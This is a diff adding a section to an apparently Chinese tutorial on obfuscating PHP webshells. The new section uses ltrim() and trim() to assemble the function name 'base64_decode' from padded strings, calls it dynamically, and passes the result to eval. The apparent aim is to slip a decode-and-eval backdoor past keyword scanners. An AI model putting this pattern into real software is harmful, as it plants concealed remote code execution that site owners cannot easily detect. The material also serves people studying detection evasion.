@@ -128,6 +128,27 @@ $a = $c('code');
 eval($b=&$a); 
 ?>
 ```
+### ltrim()和trim()函数
+* ltrim() - 移除字符串左侧的空白字符或其他预定义字符
+* trim() - 移除字符串两侧的空白字符或其他预定义字符
+```php
+<?php
+echo ltrim('mmmNice','m')."<br/>";
+echo trim('okiii','i');
+```
+输出:
+![14](https://ws1.sinaimg.cn/large/006VEsyOgy1g0royxev5aj309u061t95.jpg)
+依据这个特性。  
+```php
+<?php
+$a = ltrim('mmmbAsE64_D','m');
+$b = trim('ecODeiii','i');
+$base = $a.$b;
+$c = $base('code');
+eval($d=&$c);
+```
+
+
 
 
 
